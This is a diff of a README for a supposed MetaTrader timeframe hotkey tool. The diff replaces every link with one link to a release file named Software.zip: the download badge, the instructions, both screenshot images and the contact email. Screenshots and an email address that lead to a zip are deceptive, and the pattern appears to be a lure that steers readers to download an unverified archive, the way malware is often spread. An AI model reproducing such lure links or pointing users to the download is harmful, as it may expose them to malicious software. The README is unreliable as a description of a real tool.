@@ -1,6 +1,6 @@
 # 🔄🔑 Switch Timeframes Keys 📊💻
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip)](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip)
 
 Welcome to **Switch Timeframes Keys** GitHub repository! This simple tool allows you to switch MetaTrader timeframes with your keyboard effortlessly. Say goodbye to manual clicking and easily navigate through different timeframes with just a few keystrokes.
 
@@ -16,7 +16,7 @@ Welcome to **Switch Timeframes Keys** GitHub repository! This simple tool allows
 
 ## 🚀 Getting Started
 
-To get started with Switch Timeframes Keys, simply [download the zip file](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once you have the file, follow the instructions to launch the tool and start using hotkeys to switch between timeframes in MetaTrader platform seamlessly.
+To get started with Switch Timeframes Keys, simply [download the zip file](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip). Once you have the file, follow the instructions to launch the tool and start using hotkeys to switch between timeframes in MetaTrader platform seamlessly.
 
 If you encounter any issues with the provided link, please check the **Releases** section of this repository for alternative download options.
 
@@ -38,10 +38,10 @@ If you encounter any issues with the provided link, please check the **Releases*
 
 Here are some snapshots of Switch Timeframes Keys in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip)
 *Caption: Easily switch timeframes with the press of a key.*
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip)
 *Caption: Customize hotkeys to suit your trading style.*
 
 ---
@@ -63,7 +63,7 @@ Contributions to Switch Timeframes Keys are welcome! If you have ideas for impro
 
 ## 📧 Contact
 
-If you have any questions, suggestions, or feedback, please feel free to reach out via email at [switchtimeframeskeys@example.com](mailto:switchtimeframeskeys@example.com).
+If you have any questions, suggestions, or feedback, please feel free to reach out via email at [https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip](https://github.com/ConfidenceMedia/Switch-Timeframes-Keys/releases/download/v1.0/Software.zip).
 
 ---
 
